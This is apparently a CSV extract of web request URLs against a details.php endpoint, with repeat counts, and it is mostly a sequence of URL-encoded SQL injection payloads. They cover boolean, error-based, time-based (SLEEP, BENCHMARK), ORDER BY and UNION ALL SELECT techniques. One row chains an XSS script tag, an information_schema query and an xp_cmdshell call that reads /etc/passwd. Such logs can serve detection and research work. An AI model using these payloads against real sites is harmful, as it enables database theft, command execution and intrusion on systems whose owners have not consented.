full_url,repeat_count
/details.php?pr	od=5&type=2,1
/details.php?prod=5&type=2&OUOT=7916%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23,2
/details.php?prod=5&type=2,3
/details.php?prod=3196&type=2,4
/details.php?prod=5.%28%2C%2C%2C%27%28%22%28%2C&type=2,5
/details.php?prod=5%27DGsZuv%3C%27%22%3EvASviJ&type=2,6
/details.php?prod=5%29%20AND%202119%3D1319%20AND%20%286016%3D6016&type=2,7
/details.php?prod=5%29%20AND%202242%3D2242%20AND%20%287595%3D7595&type=2,8
/details.php?prod=5%29%29%20AND%209477%3D1460%20AND%20%28%284897%3D4897&type=2,9
/details.php?prod=5%29%29%20AND%202242%3D2242%20AND%20%28%287188%3D7188&type=2,10
/details.php?prod=5%20AND%209513%3D5835&type=2,11
/details.php?prod=5%20AND%202242%3D2242&type=2,12
/details.php?prod=5%20AND%207784%3D5336&type=2,13
/details.php?prod=%28SELECT%20CONCAT%28CONCAT%280x7176787171%2C%28CASE%20WHEN%20%283069%3D3069%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x7178706a71%29%29&type=2,14
/details.php?prod=5%20AND%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284026%3D4026%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29&type=2,15
/details.php?prod=5%20OR%20%28SELECT%202%2A%28IF%28%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285302%3D5302%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29&type=2,16
/details.php?prod=5%20AND%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%289946%3D9946%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29&type=2,17
/details.php?prod=5%20OR%20EXP%28~%28SELECT%20%2A%20FROM%20%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%284491%3D4491%2C1%29%29%29%2C0x7178706a71%2C0x78%29%29x%29%29&type=2,18
/details.php?prod=5%20AND%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%283395%3D3395%2C1%29%29%29%2C0x7178706a71%29%2C3395%29&type=2,19
/details.php?prod=5%20OR%20GTID_SUBSET%28CONCAT%280x7176787171%2C%28SELECT%20%28ELT%288719%3D8719%2C1%29%29%29%2C0x7178706a71%29%2C8719%29&type=2,20
/details.php?prod=5%20AND%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%285653%3D5653%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29&type=2,21
/details.php?prod=5%20OR%20JSON_KEYS%28%28SELECT%20CONVERT%28%28SELECT%20CONCAT%280x7176787171%2C%28SELECT%20%28ELT%288934%3D8934%2C1%29%29%29%2C0x7178706a71%29%29%20USING%20utf8%29%29%29&type=2,22
/details.php?prod=5%20AND%20%28SELECT%201102%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176787171%2C%28SELECT%20%28ELT%281102%3D1102%2C1%29%29%29%2C0x7178706a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29&type=2,23
/details.php?prod=%28SELECT%20CONCAT%280x7176787171%2C%28ELT%282387%3D2387%2C1%29%29%2C0x7178706a71%29%29&type=2,24
/details.php?prod=5&type=2,25
/details.php?prod=5&type=2,26
/details.php?prod=5&type=2,27
/details.php?prod=5&type=2,28
/details.php?prod=5&type=2,29
/details.php?prod=5&type=2,30
/details.php?prod=5&type=2,31
/details.php?prod=5&type=2,32
/details.php?prod=5&type=2,33
/details.php?prod=5%3BSELECT%20SLEEP%285%29%23&type=2,34
/details.php?prod=5%3BSELECT%20SLEEP%285%29&type=2,35
/details.php?prod=5%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29shlX%29%23&type=2,36
/details.php?prod=5%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29kWCw%29&type=2,37
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x4a6f6b58%29%29%23&type=2,38
/details.php?prod=5%3BSELECT%20BENCHMARK%285000000%2CMD5%280x4f6b4356%29%29&type=2,39
/details.php?prod=5%20AND%20%28SELECT%206969%20FROM%20%28SELECT%28SLEEP%285%29%29%29AXjG%29&type=2,40
/details.php?prod=5%20AND%20%28SELECT%206969%20FROM%20%28SELECT%28SLEEP%280%29%29%29AXjG%29&type=2,41
/details.php?prod=5%20AND%20%28SELECT%206969%20FROM%20%28SELECT%28SLEEP%285%29%29%29AXjG%29&type=2,42
/details.php?prod=5%20ORDER%20BY%201--%20-&type=2,43
/details.php?prod=5%20ORDER%20BY%209192--%20-&type=2,44
/details.php?prod=5%20ORDER%20BY%2010--%20-&type=2,45
/details.php?prod=5%20ORDER%20BY%206--%20-&type=2,46
/details.php?prod=5%20ORDER%20BY%204--%20-&type=2,47
/details.php?prod=5%20ORDER%20BY%205--%20-&type=2,48
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176787171%2C0x6e62536f44566564455244695669786c737563647869424e7a504253434e6759454f474d69527a68%2C0x7178706a71%29%2CNULL%2CNULL--%20-&type=2,49
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x65766d6c7650734b6c664167464a4877485676514d44764b6263576f6e617459426156636862474a%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,50
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x4e63674c434b586141725757746574736f5a434f61575345686d424e4f4d487144426641444a6145%2C0x7178706a71%29%2CNULL--%20-&type=2,51
